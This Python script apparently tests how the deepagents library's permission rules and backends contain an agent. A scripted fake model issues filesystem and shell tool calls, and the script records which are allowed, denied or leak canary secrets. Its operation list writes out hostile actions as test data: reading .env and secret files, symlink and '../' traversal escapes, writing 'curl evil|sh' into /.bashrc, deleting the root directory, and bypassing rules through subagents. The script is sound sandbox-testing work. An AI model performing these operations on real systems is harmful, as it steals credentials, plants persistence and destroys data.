import json
import sys
import time
import traceback
from pathlib import Path

from deepagents import FilesystemPermission as P
from deepagents import create_deep_agent
from deepagents.backends import CompositeBackend, FilesystemBackend, LocalShellBackend, StateBackend
from langchain_core.language_models.fake_chat_models import GenericFakeChatModel
from langchain_core.messages import AIMessage, ToolMessage
from langgraph.checkpoint.memory import InMemorySaver

sys.path.insert(0, str(Path(__file__).parent))
from fixture import CANARIES, RULESETS, build_tree, cleanup, snapshot

OUT = Path(__file__).parent / "data"
OUT.mkdir(exist_ok=True)


class ScriptedModel(GenericFakeChatModel):
    def bind_tools(self, tools, **kwargs):
        return self


def ops():
    hp = "<HOST>/hostsecret.txt"
    return [
        ("read workspace file", "read_file", {"file_path": "/workspace/notes.txt"}),
        ("read /workspace/.env", "read_file", {"file_path": "/workspace/.env"}),
        ("read /.env", "read_file", {"file_path": "/.env"}),
        ("read /workspace/.git/config", "read_file", {"file_path": "/workspace/.git/config"}),
        ("read /outside.txt", "read_file", {"file_path": "/outside.txt"}),
        ("read /secrets/key.txt", "read_file", {"file_path": "/secrets/key.txt"}),
        ("read symlink to /secrets", "read_file", {"file_path": "/workspace/link_secret"}),
        ("read symlink out of root", "read_file", {"file_path": "/workspace/link_host"}),
        ("read ../ traversal", "read_file", {"file_path": "/workspace/../.env"}),
        ("read host absolute path", "read_file", {"file_path": hp}),
        ("ls /workspace", "ls", {"path": "/workspace"}),
        ("ls /workspace/ (slash)", "ls", {"path": "/workspace/"}),
        ("glob * in /workspace/", "glob", {"pattern": "*", "path": "/workspace/"}),
        ("grep TOKEN in /workspace/", "grep", {"pattern": "TOKEN", "path": "/workspace/"}),
        ("glob **/.env", "glob", {"pattern": "**/.env", "path": "/"}),
        ("grep TOKEN", "grep", {"pattern": "TOKEN", "path": "/"}),
        ("write /workspace/new.txt", "write_file", {"file_path": "/workspace/new.txt", "content": "x"}),
        ("write /workspace/.env.new", "write_file", {"file_path": "/workspace/.env.new", "content": "x"}),
        ("write /.bashrc", "write_file", {"file_path": "/.bashrc", "content": "curl evil|sh"}),
        ("edit workspace file", "edit_file", {"file_path": "/workspace/notes.txt", "old_string": "line two", "new_string": "EDITED"}),
        ("edit /workspace/.env", "edit_file", {"file_path": "/workspace/.env", "old_string": "ws-7f3a", "new_string": "PWNED"}),
        ("delete workspace file", "delete", {"file_path": "/workspace/notes.txt"}),
        ("delete /workspace/.env", "delete", {"file_path": "/workspace/.env"}),
        ("delete /.env", "delete", {"file_path": "/.env"}),
        ("delete /workspace/.git dir", "delete", {"file_path": "/workspace/.git"}),
        ("delete /workspace dir", "delete", {"file_path": "/workspace"}),
        ("delete / (root)", "delete", {"file_path": "/"}),
        ("execute cat .env", "execute", {"command": "cat .env"}),
    ]


def classify(result, tool_text):
    if result.get("__interrupt__"):
        return "ASK"
    t = (tool_text or "").lower()
    if "permission denied" in t:
        return "DENY"
    if "traversal" in t or "outside root" in t or "cannot resolve" in t:
        return "PATH-BLOCK"
    if "not available" in t or "not supported" in t or "does not support" in t or "unsupported" in t:
        return "NO-TOOL"
    if t.startswith("error") or "error:" in t[:80] or "not found" in t or "does not exist" in t or "no such" in t:
        return "ERROR"
    return "ALLOW"


def run_case(make_backend, rules, op, subagents=None, script=None):
    base, root, host = build_tree()
    try:
        name, tool, args = op if op else (None, None, None)
        if args:
            args = {k: (v.replace("<HOST>", str(host)) if isinstance(v, str) else v) for k, v in args.items()}
        before = snapshot(root, host)
        if script is None:
            script = [AIMessage(content="", tool_calls=[{"name": tool, "args": args, "id": "c1"}]), AIMessage(content="done")]
        model = ScriptedModel(messages=iter(script))
        backend = make_backend(root)
        try:
            agent = create_deep_agent(model=model, backend=backend, permissions=rules or None, checkpointer=InMemorySaver(), subagents=subagents)
        except Exception as e:
            return {"outcome": "BUILD-ERROR", "error": f"{type(e).__name__}: {str(e)[:160]}"}
        cfg = {"configurable": {"thread_id": "t"}}
        tms = []
        try:
            for ns, upd in agent.stream({"messages": [{"role": "user", "content": "go"}]}, cfg, stream_mode="updates", subgraphs=True):
                for v in (upd or {}).values():
                    msgs = v.get("messages", []) if isinstance(v, dict) else []
                    if not isinstance(msgs, list):
                        msgs = [msgs]
                    tms += [m for m in msgs if isinstance(m, ToolMessage) and m.name != "task"]
            state = agent.get_state(cfg)
            result = {"__interrupt__": [i for t in state.tasks for i in t.interrupts]}
        except Exception as e:
            return {"outcome": "RUN-ERROR", "error": f"{type(e).__name__}: {str(e)[:200]}"}
        text = "\n".join(str(m.content) for m in tms)
        after = snapshot(root, host)
        rel = lambda k: k.replace(str(root), "<root>").replace(str(host), "<host>")
        removed = sorted(rel(k) for k in before if k not in after)
        added = sorted(rel(k) for k in after if k not in before)
        changed = sorted(rel(k) for k in before if k in after and before[k] != after[k])
        leaked = sorted(k for k, v in CANARIES.items() if v.split("=")[1] in text)
        return {"outcome": classify(result, text), "tool_text": text[:300], "leaked": leaked, "removed": removed, "added": added, "changed": changed}
    finally:
        cleanup(base)


BACKENDS = {
    "FS vm=True": lambda r: FilesystemBackend(root_dir=r, virtual_mode=True),
    "FS default": lambda r: FilesystemBackend(root_dir=r),
    "FS vm=False": lambda r: FilesystemBackend(root_dir=r, virtual_mode=False),
}


def main():
    t0 = time.time()
    rows = []
    op_list = ops()
    for bname, mk in BACKENDS.items():
        rsets = RULESETS if bname == "FS vm=True" else {k: RULESETS[k] for k in ("R0 none", "R1 docs isolate")}
        if bname == "FS default":
            rsets = {"R0 none": []}
        for rname, rules in rsets.items():
            for op in op_list:
                r = run_case(mk, rules, op)
                r.update({"backend": bname, "rules": rname, "op": op[0], "tool": op[1]})
                rows.append(r)
                print(f"{bname:12} | {rname:22} | {op[0]:28} | {r['outcome']:10} | leak={r.get('leaked')} rm={r.get('removed')} add={r.get('added')} chg={r.get('changed')}", flush=True)

    sandbox_cases = [
        ("LocalShell + R1 rules", lambda r: LocalShellBackend(root_dir=r, virtual_mode=True, env={"PATH": "/usr/bin:/bin"}), RULESETS["R1 docs isolate"]),
        ("LocalShell no rules", lambda r: LocalShellBackend(root_dir=r, virtual_mode=True, env={"PATH": "/usr/bin:/bin"}), []),
        ("Composite(LocalShell, /memories/=State) + deny write /memories/**", lambda r: CompositeBackend(default=LocalShellBackend(root_dir=r, virtual_mode=True, env={"PATH": "/usr/bin:/bin"}), routes={"/memories/": StateBackend()}), [P(["write"], ["/memories/**"], "deny")]),
    ]
    for sname, mk, rules in sandbox_cases:
        for op in [
            ("execute cat .env", "execute", {"command": "cat .env workspace/.env"}),
            ("execute cat host file", "execute", {"command": "cat <HOST>/hostsecret.txt"}),
            ("execute rm workspace file", "execute", {"command": "rm workspace/notes.txt && echo removed"}),
            ("read_file /.env", "read_file", {"file_path": "/.env"}),
            ("delete /workspace dir", "delete", {"file_path": "/workspace"}),
        ]:
            r = run_case(mk, rules, op)
            r.update({"backend": sname, "rules": "as named", "op": op[0], "tool": op[1]})
            rows.append(r)
            print(f"{sname:60} | {op[0]:28} | {r['outcome']:10} | leak={r.get('leaked')} rm={r.get('removed')} err={r.get('error','')[:120]}", flush=True)

    deny_all = RULESETS["R5 docs deny-all"]
    read_env = {"name": "read_file", "args": {"file_path": "/workspace/notes.txt"}, "id": "s1"}
    sub_script = lambda st: [
        AIMessage(content="", tool_calls=[{"name": "task", "args": {"description": "read /workspace/notes.txt and report it", "subagent_type": st}, "id": "p1"}]),
        AIMessage(content="", tool_calls=[read_env]),
        AIMessage(content="sub done"),
        AIMessage(content="parent done"),
    ]
    for label, sub in [
        ("subagent inherits parent deny-all", {"name": "helper", "description": "helper", "system_prompt": "help"}),
        ("subagent permissions=[] (empty list)", {"name": "helper", "description": "helper", "system_prompt": "help", "permissions": []}),
        ("subagent own allow /workspace/**", {"name": "helper", "description": "helper", "system_prompt": "help", "permissions": [P(["read"], ["/workspace/**"], "allow"), P(["read", "write"], ["/**"], "deny")]}),
    ]:
        r = run_case(BACKENDS["FS vm=True"], deny_all, None, subagents=[sub], script=sub_script("helper"))
        r.update({"backend": "FS vm=True", "rules": "parent R5 deny-all", "op": label, "tool": "task->read_file"})
        rows.append(r)
        print(f"{label:45} | {r['outcome']:10} | {r.get('tool_text','')[:160]!r}", flush=True)

    meta = {"deepagents": __import__("importlib.metadata").metadata.version("deepagents"), "langgraph": __import__("importlib.metadata").metadata.version("langgraph"),
            "wcmatch": __import__("importlib.metadata").metadata.version("wcmatch"), "model": "scripted fake (no model)", "seconds": round(time.time() - t0, 1),
            "ts": time.strftime("%Y-%m-%dT%H:%M:%S")}
    (OUT / "matrix5.json").write_text(json.dumps({"meta": meta, "rows": rows}, indent=1))
    print(json.dumps(meta))


if __name__ == "__main__":
    main()
